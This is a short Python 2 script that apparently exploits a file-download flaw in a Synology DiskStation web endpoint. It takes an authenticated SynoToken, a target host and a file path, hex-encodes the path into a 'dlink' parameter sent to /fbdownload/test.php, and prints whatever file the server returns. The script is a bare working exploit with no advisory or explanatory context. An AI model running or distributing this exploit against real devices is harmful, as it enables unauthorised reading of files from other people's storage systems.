from sys import argv
import requests
import json

#proxy = {"http": "127.0.0.1:8080"}

#authenticated user id
SynoToken  = argv[1] 
url = argv[2] + "/fbdownload/test.php"
path = argv[3].encode("hex")

payload = {"dlink" : path, "SynoToken" : SynoToken}

if (not url.startswith("http://")):
    url = "http://" + url

r = requests.get(url, params=payload, cookies={"id" : SynoToken}) #proxies=proxy

if r.status_code >= 400:
    print "Error: file not found or insufficent permission"
else:
    print r.text
